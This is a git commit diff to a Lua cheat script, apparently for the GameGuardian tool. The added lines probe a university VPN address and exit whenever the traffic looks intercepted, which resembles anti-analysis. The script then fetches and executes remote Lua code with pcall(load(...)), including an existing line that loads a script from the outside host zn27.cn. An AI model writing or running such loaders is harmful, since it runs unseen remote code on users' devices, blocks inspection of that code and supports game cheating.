4fb36b9a77a0c065d854bccc074166da3728d741
6xingyu <118302684+6xingyu@users.noreply.github.com>
2022-12-02 13:17:20 +0800

    Update xiyangyang.lua

--- xiyangyang.lua
+++ xiyangyang.lua
@@ -1,6 +1,21 @@
 
 
 
+gg.alert("辅助免费开放勿售卖")
+
+ffvpn= "https://vpn.uibe.edu.cn/por/phone_index.csp?rnd=0.23178949332658605#https%3A%2F%2Fvpn.uibe.edu.cn%2F"
+x=(tostring(gg.makeRequest(ffvpn)))
+if x=="The user did not allow access to the Internet." then gg.alert("禁止访问❌") 
+while true do os.exit() end
+return false
+else
+if x:find("javax") or x:find("net")  or x:find("SSL") or x:find("peer") or x:find("Exception") or x:find("I/O")  then
+while true do gg.alert("已开启防御式！数据异常❌请联系作者！") os.exit() end
+return
+end end
+if yun==nil then else
+pcall(load(gg.makeRequest(yun).content)) end
+
 
 local xiuran='http://y.i.zn27.cn/kss.lua'
 pcall(load(gg.makeRequest(xiuran).content))
